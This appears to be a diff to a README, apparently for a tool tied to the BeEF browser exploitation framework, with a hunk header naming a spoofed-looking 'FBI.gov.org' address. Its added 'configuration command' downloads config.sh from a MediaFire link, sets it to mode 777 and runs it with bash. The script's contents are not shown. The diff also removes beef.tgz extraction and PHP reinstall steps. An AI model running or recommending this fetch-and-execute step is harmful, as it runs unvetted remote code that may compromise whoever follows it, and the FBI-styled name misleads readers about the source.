@@ -3,6 +3,8 @@ https://FBI.gov.org
 
 
 #Configuration command#
+
+
 1 curl -s -LO https://download1482.mediafire.com/bsxh1o7s30tg/eu2zpq272m9u0nl/config.sh
 
 2 chmod 777 config.sh
@@ -10,15 +12,9 @@ https://FBI.gov.org
 3  bash config.sh
 
 
-tar -xvzf beef.tgz
-to fix php problems -> This commands helps me:
 
-1) Remove PHP and all his libraries and files
 
-sudo apt-get purge php7.*
-2) Install PHP again
 
-sudo apt-get install php7.2
 <!-- Improved compatibility of back to top link: See: https://github.com/othneildrew/Best-README-Template/pull/73 -->
 <a name="readme-top"></a>
 <!--
